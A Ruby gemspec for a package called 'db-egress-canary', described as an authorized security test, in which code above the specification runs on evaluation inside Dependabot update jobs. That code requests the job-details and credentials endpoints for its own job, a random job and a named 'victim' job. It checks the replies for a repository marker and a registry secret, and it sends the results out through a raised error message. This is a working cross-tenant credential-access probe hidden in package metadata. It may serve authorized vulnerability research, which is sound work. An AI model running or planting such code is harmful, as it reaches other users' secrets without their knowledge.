require "digest"
require "open-uri"

REPO_MARKER_SHA256 = "2fbf192f61ed90688fbdbd61a46e8f2cdb73dfebdf9ffa24444a31cb346ff881"
REGISTRY_SECRET_SHA256 = "57889497fe617b8184beee6d7e58fd1970dc97e6f2fb723e618c076ed98a16c2"
VICTIM_JOB_ID = "1686152375"
RANDOM_JOB_ID = "992091537953"

def marker_match?(body, width, expected_hash)
  body.scan(/[0-9a-f]{#{width}}/i).any? do |candidate|
    Digest::SHA256.hexdigest(candidate.downcase) == expected_hash
  end
end

def bounded_probe(label, base_url, job_id, endpoint)
  status = 0
  body = +""
  error_class = "none"

  begin
    URI.open(
      "#{base_url}/update_jobs/#{job_id}/#{endpoint}",
      open_timeout: 8,
      read_timeout: 8,
      redirect: false
    ) do |response|
      status = response.status.first.to_i
      body = response.read
    end
  rescue OpenURI::HTTPError => error
    status = error.io.status.first.to_i
    body = error.io.read
  rescue StandardError => error
    error_class = error.class.name
  end

  repo_match = marker_match?(body, 32, REPO_MARKER_SHA256)
  secret_match = marker_match?(body, 64, REGISTRY_SECRET_SHA256)
  sanitized = {
    label: label,
    status: status,
    length: body.bytesize,
    sha: Digest::SHA256.hexdigest(body),
    repo_match: repo_match,
    secret_match: secret_match,
    error: error_class
  }
  warn format(
    "CODEX_DB_BINDING label=%<label>s status=%<status>d length=%<length>d " \
      "sha256=%<sha>s repo_marker_match=%<repo>s secret_match=%<secret>s error=%<error>s",
    label: label,
    status: status,
    length: sanitized[:length],
    sha: sanitized[:sha],
    repo: repo_match,
    secret: secret_match,
    error: error_class
  )
  sanitized
end

if ENV["DEPENDABOT_API_URL"] && ENV["DEPENDABOT_JOB_ID"]
  once_path = "/tmp/codex_dependabot_job_binding_once"
  begin
    File.open(once_path, File::WRONLY | File::CREAT | File::EXCL, 0o600) {}
  rescue Errno::EEXIST
    raise "CODEX_DEPENDABOT_OBJECT_BINDING_ALREADY_RAN"
  end

  base_url = ENV.fetch("DEPENDABOT_API_URL").sub(%r{/$}, "")
  own_job_id = ENV.fetch("DEPENDABOT_JOB_ID")
  warn format(
    "CODEX_DB_BINDING environment api_url_present=true own_job_id_length=%<length>d " \
      "raw_job_token_nonempty=%<token>s",
    length: own_job_id.length,
    token: !ENV.fetch("DEPENDABOT_JOB_TOKEN", "").empty?
  )

  results = [
    bounded_probe("own_details", base_url, own_job_id, "details"),
    bounded_probe("own_credentials", base_url, own_job_id, "credentials"),
    bounded_probe("random_details", base_url, RANDOM_JOB_ID, "details"),
    bounded_probe("random_credentials", base_url, RANDOM_JOB_ID, "credentials"),
    bounded_probe("victim_details", base_url, VICTIM_JOB_ID, "details"),
    bounded_probe("victim_credentials", base_url, VICTIM_JOB_ID, "credentials")
  ]
  warn format(
    "CODEX_DB_BINDING summary repo_marker_matches=%<repo>d secret_matches=%<secret>d requests=6",
    repo: results.count { |result| result[:repo_match] },
    secret: results.count { |result| result[:secret_match] }
  )
  encoded_results = results.map do |result|
    format(
      "%<label>s,status=%<status>d,length=%<length>d,sha256=%<sha>s," \
        "repo_marker_match=%<repo>s,secret_match=%<secret>s,error=%<error>s",
      label: result[:label],
      status: result[:status],
      length: result[:length],
      sha: result[:sha],
      repo: result[:repo_match],
      secret: result[:secret_match],
      error: result[:error]
    )
  end.join(";")
  raise "CODEX_DB_BINDING_RESULTS #{encoded_results}"
end

Gem::Specification.new do |spec|
  spec.name = "db-egress-canary"
  spec.version = "2.0.3"
  spec.summary = "Synthetic Dependabot update-job object-binding fixture"
  spec.authors = ["Authorized security test"]
  spec.files = ["lib/db_egress_canary.rb"]
  spec.require_paths = ["lib"]
end
